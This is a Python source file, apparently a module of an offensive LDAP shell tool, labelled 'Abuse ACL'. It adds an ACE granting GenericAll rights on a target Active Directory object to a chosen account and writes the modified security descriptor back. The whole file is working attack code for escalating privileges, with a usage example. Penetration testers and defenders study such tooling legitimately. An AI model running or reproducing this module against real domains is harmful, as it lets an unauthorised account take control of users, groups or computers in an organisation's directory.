import logging
from ldap3 import Connection
from ldapdomaindump import domainDumper
from pydantic import BaseModel, Field
from ldap_shell.ldap_modules.base_module import BaseLdapModule, ArgumentType
import ldap3
from ldap_shell.utils.ldap_utils import LdapUtils
from ldap_shell.utils.ace_utils import AceUtils
from ldap_shell.utils.ldaptypes import SR_SECURITY_DESCRIPTOR

class LdapShellModule(BaseLdapModule):
    """Module for setting GenericAll permissions"""
    
    help_text = "Set GenericAll permissions for a target object"
    examples_text = """
    You can use this module to set GenericAll permissions on a target object.
    Example: set GenericAll for target user admin allowing user john to control it
    `set_genericall admin john`
    ```
    [INFO] DACL modified successfully! john now has control of admin
    ```
    """
    module_type = "Abuse ACL"

    class ModuleArgs(BaseModel):
        target: str = Field(
            description="Target object (user, computer, group, etc)",
            arg_type=ArgumentType.DN
        )
        grantee: str = Field(
            None,
            description="Account being granted GenericAll rights",
            arg_type=[ArgumentType.USER, ArgumentType.COMPUTER, ArgumentType.GROUP]
        )

    def __init__(self, args_dict: dict, 
                 domain_dumper: domainDumper, 
                 client: Connection,
                 log=None):
        self.args = self.ModuleArgs(**args_dict)
        self.domain_dumper = domain_dumper
        self.client = client
        self.log = log or logging.getLogger('ldap-shell.shell')

    def __call__(self):
        if not LdapUtils.check_dn(self.client, self.domain_dumper, self.args.target):
            self.log.error('Invalid DN: %s', self.args.target)
            return
        
        # Get target information
        target_dn = self.args.target
        if not target_dn:
            self.log.error(f'Target object not found: {self.args.target}')
            return

        # Get grantee account information
        grantee_dn = LdapUtils.get_dn(self.client, self.domain_dumper, self.args.grantee)
        if not grantee_dn:
            self.log.error(f'Grantee account not found: {self.args.grantee}')
            return

        # Get grantee SID
        grantee_sid = LdapUtils.get_sid(self.client, self.domain_dumper, self.args.grantee)
        if not grantee_sid:
            self.log.error(f'Failed to get SID for: {self.args.grantee}')
            return

        # Get current security descriptor
        try:
            sd_data, _ = LdapUtils.get_info_by_dn(self.client, self.domain_dumper, target_dn)
            
            if sd_data:
                sd = SR_SECURITY_DESCRIPTOR(data=sd_data[0])
            else:
                sd = AceUtils.create_empty_sd()

        except Exception as e:
            self.log.error(f'Error processing security descriptor: {str(e)}')
            return

        # Add new ACE with GenericAll rights
        sd['Dacl'].aces.append(AceUtils.create_allow_ace(grantee_sid))  # GenericAll
        
        # Apply changes
        try:
            res = self.client.modify(
                target_dn,
                {'nTSecurityDescriptor': [(ldap3.MODIFY_REPLACE, [sd.getData()])]},
                controls=ldap3.protocol.microsoft.security_descriptor_control(sdflags=0x04)
            )
        except Exception as e:
            self.log.error(f'Modification failed: {str(e)}')
            return

        if res:
            self.log.info('DACL modified successfully! %s now has control of %s',
                        self.args.grantee, self.args.target)
            if self.client.authentication == 'ANONYMOUS' and self.client.user.split('\\')[1].lower() == grantee_dn.split(',')[0].split('=')[1].lower():
                self.log.info('For the changes to take effect, please restart ldap_shell.')
        else:
            self.log.error('Failed to modify DACL: %s', self.client.result['description'])
